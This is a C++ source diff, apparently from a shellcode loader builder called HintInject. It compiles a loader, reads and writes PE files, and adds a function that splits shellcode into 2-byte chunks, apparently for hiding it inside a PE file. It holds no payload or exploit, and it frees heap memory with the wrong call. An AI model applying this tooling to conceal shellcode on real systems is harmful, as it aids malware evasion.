@@ -28,7 +28,7 @@ void ClearDirectory() {
 	char removedDir1[MAX_PATH] = { 0 };
 	char removedDir2[MAX_PATH] = { 0 };
 	sprintf_s(removedDir1, "%sx64\\JustLoader\\", SOLUTIONDIR);
-	sprintf_s(removedDir2, "%sHintInject\\x64\\", SOLUTIONDIR);
+	sprintf_s(removedDir2, "%sHintInjectLoader\\x64\\", SOLUTIONDIR);
 	if (DirectoryExists(removedDir1)) {
 		DeleteDirectory(removedDir1);
 	}
@@ -44,14 +44,16 @@ char* CompileLoader() {
 	if (pipe != NULL) {
 		char compilerPath[MAX_PATH] = { 0 };
 		char fullCommand[MAX_PATH] = { 0 };
-		char loaderBinaryPath[MAX_PATH] = { 0 };
+		char* loaderBinaryPath = (char*)HeapAlloc(GetProcessHeap(), 0, MAX_PATH);
 		if (fgets(compilerPath, MAX_PATH, pipe) != NULL) {
 			//Remove new line
 			compilerPath[strlen(compilerPath) - 1] = '\0';
 			sprintf_s(fullCommand, "\"\"%s\\MSBuild\\Current\\Bin\\MSBuild.exe\" %s\\HintInject.sln /t:HintInjectLoader /property:Configuration=JustLoader /property:RuntimeLibrary=MT\"\n", compilerPath, SOLUTIONDIR);
 			FILE* pipe2 = _popen(fullCommand, "rt");
 			_pclose(pipe2);
-			sprintf_s(loaderBinaryPath, "%sx64\\JustLoader\\HintInjectLoader.exe", SOLUTIONDIR);
+			memset(fullCommand, 0x00, MAX_PATH);
+			sprintf_s(fullCommand, "%sx64\\JustLoader\\HintInjectLoader.exe", SOLUTIONDIR);
+			memcpy(loaderBinaryPath, fullCommand, MAX_PATH);
 			if (INVALID_FILE_ATTRIBUTES == GetFileAttributesA(loaderBinaryPath) && GetLastError() == ERROR_FILE_NOT_FOUND) {
 				std::cout << "[!] Compiled binary not found!" << std::endl;
 				free(loaderBinaryPath);
@@ -72,9 +74,11 @@ char* CompileLoader() {
 }
 
 PBYTE ReadFileFromDisk(LPCSTR fileName, uint64_t& fileSize) {
-	HANDLE hFile = CreateFileA(fileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	std::cout << fileName << std::endl;
+	HANDLE hFile = CreateFileA(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hFile == INVALID_HANDLE_VALUE) {
-		std::cout << ("Failed to open the file\n");
+		std::cout << "Failed to open the file\n";
+		std::cout << GetLastError() << std::endl;
 		return NULL;
 	}
 	fileSize = GetFileSize(hFile, NULL);
@@ -98,4 +102,35 @@ PBYTE ReadFileFromDisk(LPCSTR fileName, uint64_t& fileSize) {
 	}
 	CloseHandle(hFile);
 	return fileBuffer;
+}
+
+
+bool WriteNewPE(LPCSTR fileName, PBYTE buffer, uint64_t size) {
+	HANDLE hFile = CreateFileA(fileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	DWORD dwBytesWritten = 0;
+	if (hFile == INVALID_HANDLE_VALUE)
+	{
+		std::cout << "Terminal failure: Unable to open file for write.\n";
+		return false;
+	}
+
+	if (!WriteFile(hFile, buffer, size, &dwBytesWritten, NULL)) {
+		std::cout << "Write failure.\n";
+		return false;
+	}
+	CloseHandle(hFile);
+	return true;
+}
+
+PBYTE SplitShellcode(PBYTE shellcodeBuffer, uint64_t sizeOfShellcode, uint64_t& numberOfChunks) {
+	numberOfChunks = ceil(sizeOfShellcode / 2.0);
+	PBYTE returnValue = (PBYTE)HeapAlloc(GetProcessHeap(), 0, numberOfChunks * sizeof(WORD));
+	// May not be required
+	memset(returnValue, 0x00, sizeof(WORD) * numberOfChunks);
+	memcpy(returnValue, shellcodeBuffer, sizeOfShellcode);
+	return returnValue;
+}
+
+int GetRandomNumber(int min, int max) {
+	return min + rand() % ((max + 1) - min);
 }
